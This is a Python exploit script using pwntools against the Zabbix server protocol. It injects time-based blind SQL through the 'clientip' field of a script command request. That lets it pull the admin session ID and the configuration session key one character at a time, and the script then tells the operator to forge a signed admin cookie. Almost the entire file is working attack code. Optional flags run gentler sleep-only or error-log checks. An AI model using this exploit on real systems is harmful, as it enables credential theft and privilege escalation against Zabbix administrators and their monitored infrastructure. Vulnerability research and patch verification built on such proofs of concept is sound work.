#!/usr/bin/python3
import json

import argparse
import pwnlib.context
from pwn import *
from datetime import datetime


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Command-line option parser example')
    parser.add_argument("--false_time", help="Time to sleep in case of wrong guess(make it smaller than true time, default=1)", default="1")
    parser.add_argument("--true_time", help="Time to sleep in case of right guess(make it bigger than false time, default=10)", default="10")
    parser.add_argument("--ip", help="Zabbix server IP", required=True)
    parser.add_argument("--port", help="Zabbix server port(default=10051)", default="10051")
    parser.add_argument("--sid", help="Session ID of low privileged user", required=True)
    parser.add_argument("--hostid", help="hostid of any host accessible to user with defined sid", required=True)
    parser.add_argument("--poc", action='store_true', help="Use this key if you want only PoC, PoC will simply make sleep 1,2,5 seconds on mysql server", default=False)
    parser.add_argument("--poc2", action='store_true', help="Use this key to simply generate error in zabbix logs, check logs later to see results", default=False)

    args = parser.parse_args()


def send_message(ip, port, sid, hostid, injection):
    zbx_header = "ZBXD\x01".encode()

    #query
    # insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,"
    # 			"resourcename,resourcetype,recordsetid,details) values ('%s'," ZBX_FS_UI64 ",'%s',%d,'%d','%s',"
    # 			ZBX_FS_UI64 ",'%s',%d,'%s','%s')
    #

    message = {
        "request": "command",
        "sid": sid,
        "scriptid": "3",
        "clientip": "' + " + injection + "+ '",
        "hostid": hostid
    }

    message_json = json.dumps(message)
    #print("message=%s" % message)
    message_length = struct.pack('<q', len(message_json))
    message = zbx_header + message_length + message_json.encode()

    #print("Sending message %s" % message)
    r = remote(ip, port, level='debug')
    r.send(message)
    response = r.recv(100)
    r.close()
    #print(response)


def extract_admin_session_id(ip, port, sid, hostid, time_false, time_true):
    session_id = ""
    token_length = 32
    for i in range(1, token_length+1):
        for c in string.digits + "abcdef":
            print("\n(+) trying c=%s" % c, end="", flush=True)
            before_query = datetime.now().timestamp()
            query = "(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1),%d,1))=%d) THEN sleep(%d) ELSE sleep(%d) END)" % (i, ord(c), time_true, time_false)
            send_message(ip, port, sid, hostid, query)
            after_query = datetime.now().timestamp()

            if time_true > (after_query-before_query) > time_false:
                continue
            else:
                session_id += c
                print("(+) session_id=%s" % session_id, end="", flush=True)
                break

    print("\n")

    return session_id


def extract_config_session_key(ip, port, sid, hostid, time_false, time_true):
    token = ""
    token_length = 32
    for i in range(1, token_length+1):
        for c in string.digits + "abcdef":
            print("\n(+) trying c=%s" % c, end="", flush=True)
            before_query = datetime.now().timestamp()
            query = "(select CASE WHEN (ascii(substr((select session_key from config),%d,1))=%d) THEN sleep(%d) ELSE sleep(%d) END)" % (i, ord(c), time_true, time_false)
            send_message(ip, port, sid, hostid, query)
            after_query = datetime.now().timestamp()

            if time_true > (after_query-before_query) > time_false:
                continue
            else:
                token += c
                print("(+) session_key=%s" % token, end="", flush=True)
                break

    print("\n")

    return token


def tiny_poc(ip, port, sid, hostid):
    print("(+) Running simple PoC...\n", end="", flush=True)

    print("(+) Sleeping for 1 sec...\n", end="", flush=True)
    before_query = datetime.now().timestamp()
    query = "(select sleep(1))"
    send_message(ip, port, sid, hostid, query)
    after_query = datetime.now().timestamp()
    print("(+) Request time: %d\n" % (after_query-before_query))

    print("(+) Sleeping for 5 sec...\n", end="", flush=True)
    before_query = datetime.now().timestamp()
    query = "(select sleep(5))"
    send_message(ip, port, sid, hostid, query)
    after_query = datetime.now().timestamp()
    print("(+) Request time: %d\n" % (after_query - before_query))

    print("(+) Sleeping for 10 sec...\n", end="", flush=True)
    before_query = datetime.now().timestamp()
    query = "(select sleep(10))"
    send_message(ip, port, sid, hostid, query)
    after_query = datetime.now().timestamp()
    print("(+) Request time: %d\n" % (after_query - before_query))


def poc_to_check_in_zabbix_log(ip, port, sid, hostid):
    print("(+) Sending SQL request for MySQL version...\n", end="", flush=True)
    query = "(version())"
    send_message(ip, port, sid, hostid, query)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Command-line option parser example')
    parser.add_argument("--false_time", help="Time to sleep in case of wrong guess(make it smaller than true time, default=1)", default="1")
    parser.add_argument("--true_time", help="Time to sleep in case of right guess(make it bigger than false time, default=10)", default="10")
    parser.add_argument("--ip", help="Zabbix server IP")
    parser.add_argument("--port", help="Zabbix server port(default=10051)", default="10051")
    parser.add_argument("--sid", help="Session ID of low privileged user")
    parser.add_argument("--hostid", help="hostid of any host accessible to user with defined sid")
    parser.add_argument("--poc", action='store_true', help="Use this key if you want only PoC, PoC will simply make sleep 1,2,5 seconds on mysql server", default=False)
    parser.add_argument("--poc2", action='store_true', help="Use this key to simply generate error in zabbix logs, check logs later to see results", default=False)

    args = parser.parse_args()

    if args.poc:
        tiny_poc(args.ip, int(args.port), args.sid, args.hostid)
    elif args.poc2:
        poc_to_check_in_zabbix_log(args.ip, int(args.port), args.sid, args.hostid)
    else:
        print("(+) Extracting Zabbix config session key...\n", end="", flush=True)
        config_session_key = extract_config_session_key(args.ip, int(args.port), args.sid, args.hostid, int(args.false_time), int(args.true_time))
        print("(+) config session_key=%s\n" % config_session_key, end="", flush=True)

        print("(+) Extracting admin session_id...")
        admin_sessionid = extract_admin_session_id(args.ip, int(args.port), args.sid, args.hostid, int(args.false_time), int(args.true_time))
        print("(+) admin session_id=%s\n" % admin_sessionid, end="", flush=True)
        print("(+) session_key=%s, admin session_id=%s. Now you can genereate admin zbx_cookie and sign it with session_key" % (config_session_key, admin_sessionid))
